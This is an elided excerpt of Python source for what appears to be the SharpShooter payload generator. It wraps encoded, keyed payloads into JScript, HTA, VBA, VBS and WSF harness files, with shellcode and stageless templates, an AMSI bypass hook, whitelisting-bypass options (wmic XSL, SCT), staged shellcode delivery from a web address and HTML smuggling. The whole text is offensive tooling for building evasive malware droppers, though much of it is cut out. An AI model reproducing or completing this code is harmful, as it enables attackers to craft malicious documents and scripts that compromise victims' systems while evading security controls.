...
"""
    ...
    def validate_args(x):
        ...
        parser.add_argument("--out_dir", metavar="<outdir>", dest="output_dir", default="", help="The path where to write the ouput file")
        ...
        parser.add_argument("--templ_dir", metavar="<tmpld>", dest="template_dir", default=None, help="The path to the templates")
    ...
    def run(x):
        x.template_dir = "templates/"
        if x.args.template_dir is not None:
            template_dir = x.args.template_dir
            if template_dir[-1] != "/":
                x.template_dir = template_dir + "/"


        x.template_body = ""
        x.template_base = x.template_dir+"sharpshooter."
...
End Sub"""
        ...
        if not x.args.payload=="slk":
            ...
            if((x.args.stageless or x.stageless_payload is True) and x.dotnet_version == 2):
                x.template_base = x.template_dir+"stageless."
            elif((x.args.stageless or x.stageless_payload is True) and x.dotnet_version == 4):
                x.template_base = x.template_dir+"stagelessv4."
            elif(x.dotnet_version == 4):
                x.template_base = x.template_dir+"sharpshooterv4."
        ...
        while True:
            ...
            try:
                ...
                if (x.shellcode_payload):
                    ...
                    x.shellcode_template = x.read_file(x.template_dir+"shellcode.cs")
        ...
        x.amsi_bypass = ""
        x.outputfile = x.args.output_dir + x.args.output
        ...
        if("js" in x.file_type or x.args.comtechnique):
            x.harness = x.read_file(x.template_dir+"harness.js")
            ...
            x.harness = x.read_file(x.template_dir+"harness.wsf")
            x.payload = x.harness.replace("%B64PAYLOAD%", str(x.payload_encoded,'utf-8'))
            x.payload = x.payload.replace("%KEY%", "'%s'" % (x.key))
            x.payload_minified = jsmin(x.payload)
        elif("hta" in x.file_type):
            x.harness = x.read_file(x.template_dir+"harness.hta")
            x.payload = x.harness.replace("%B64PAYLOAD%", str(x.payload_encoded,'utf-8'))
            x.payload = x.payload.replace("%KEY%", "'%s'" % (x.key))
            x.payload_minified = jsmin(x.payload)
        elif("vba" in x.file_type):
            x.harness = x.read_file(x.template_dir+"harness.vba")
            x.payload = x.harness.replace("%B64PAYLOAD%", str(x.payload_encoded,'utf-8'))
            x.payload = x.payload.replace("%KEY%", "\"%s\"" % (x.key))
            x.payload_minified = jsmin(x.payload)
            ...
            x.harness = x.read_file(x.template_dir+"harness.vbs")
            x.payload = x.harness.replace("%B64PAYLOAD%", str(x.payload_encoded,'utf-8'))
            x.payload = x.payload.replace("%KEY%", "\"%s\"" % (x.key))
            # print(x.payload)
        ...
        f = open(x.outputfile_payload, 'wb')
        #print(payload)
        if(x.payload_type == 8):
        ...
        if(x.args.comtechnique):
            if not x.args.awltechnique or x.args.awltechnique == "wmic":
                x.payload_file = x.outputfile + ".xsl"
            else:
                x.payload_file = x.outputfile + ".sct"
        ...
        if x.shellcode_delivery:
            print_msg(f"File [{x.outputfile_payload}] successfully created!\n\t  ^^ Selected delivery method will deliver this")
            x.outputfile_shellcode = x.outputfile + ".payload"
            with open(x.outputfile_shellcode, 'wb') as f:
                x.gzip_encoded = base64.b64encode(x.shellcode_gzip.getvalue())
                f.write(x.gzip_encoded)
                f.close()
                print_msg(f"File [{x.outputfile_shellcode}] successfully created!... \n\t  ^^ Selected delivery method expects this at: {x.args.web}")
        else:
            print_msg("Written delivery payload to /%s" % x.outputfile_payload)
        ...
        if not x.file_type in ["vba"]:
            if (x.args.smuggle):
                ...
                embedinhtml.run_embedInHtml(x.key, x.outputfile_payload, x.outputfile + ".html", x.template)
